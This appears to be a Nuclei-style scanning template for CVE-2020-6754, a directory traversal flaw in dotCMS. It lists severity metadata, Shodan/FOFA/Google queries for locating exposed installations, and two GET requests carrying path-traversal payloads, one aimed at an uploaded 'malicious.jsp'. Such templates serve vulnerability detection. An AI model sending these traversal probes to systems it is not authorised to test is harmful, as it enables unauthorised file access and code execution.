id: CVE-2020-6754

info:
  name: dotCMS Directory Traversal and Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: dotCMS before 5.2.4 is vulnerable to directory traversal, leading to incorrect access control. It allows an attacker to read or execute files under $TOMCAT_HOME/webapps/ROOT/assets.
  impact: |
    Successful exploitation could lead to unauthorized access and execution of arbitrary code.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-6754
    cwe-id: CWE-22
    epss-score: 0.17845
    epss-percentile: 0.96322
    cpe: cpe:2.3:a:dotcms:dotcms:*:*:*:*:*:*:*:*
  metadata:
    vendor: dotcms
    product: dotcms
    shodan-query: http.title:"dotCMS"
    fofa-query: title="dotcms"
    google-query: intitle:"dotcms"

http:
  - method: GET
    path:
      - "{{BaseURL}}/234aa/test/../../assets/messages/cms_language_en.properties"
      - "{{BaseURL}}/234aa/../assets/tmp_upload/malicious.jsp"

    matchers:
      - type: word
        words:
          - "cms_language_en.properties"
          - "<%="
        part: body
        condition: or
